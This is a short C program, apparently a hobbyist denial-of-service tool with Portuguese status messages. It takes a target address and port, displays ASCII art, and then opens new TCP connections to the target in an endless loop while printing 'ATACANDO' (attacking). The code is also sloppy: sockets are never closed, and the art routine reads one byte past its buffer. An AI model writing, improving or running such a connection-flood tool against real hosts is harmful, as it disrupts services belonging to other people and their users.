#include <stdio.h>
#include <netdb.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

#define buf 456
#define err "[!]"
#define crr "[*]"
#define true 1

void msgerror(const char *msg){
  fprintf(stderr,"%s Error by -> %s\n", err, msg);
  exit(EXIT_FAILURE);
}

static void asciiart_show(){
  char buffer[buf];
  system("clear");
  FILE *fh;
  fh = fopen("ascii.txt","rb");
  fread(buffer, sizeof(buffer), 1, fh);
  for(int i = 0; i<=456; ++i){
    printf("%c", buffer[i]);
  }
  fclose(fh);

}

int main(int argc, char *argv[]){
  asciiart_show();	
  if (argc <= 2){
    msgerror("too few args!");
  }
  int soc, conn;
  char *address = argv[1];
  int port = atoi(argv[2]);

  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = inet_addr(address);
  
  soc = socket(AF_INET, SOCK_STREAM, 0);
  conn = connect(soc, (struct sockaddr*)&addr, sizeof(addr));
  if(conn == 0){
    
    printf("%s Endereço(%s) e porta(%d) connectados com sucesso!!\n",crr,address,port);
    printf("%s Iniciando Dos em 5 segundos\n", crr);
    sleep(5);
    while(1){
      printf("%s ATACANDO %s %d\n", crr, address, port);
      soc = socket(AF_INET, SOCK_STREAM, 0);
      connect(soc, (struct sockaddr*)&addr, sizeof(addr));
    }
  }
  else{
    msgerror("host indisponivel");
  }
    return 0;
}
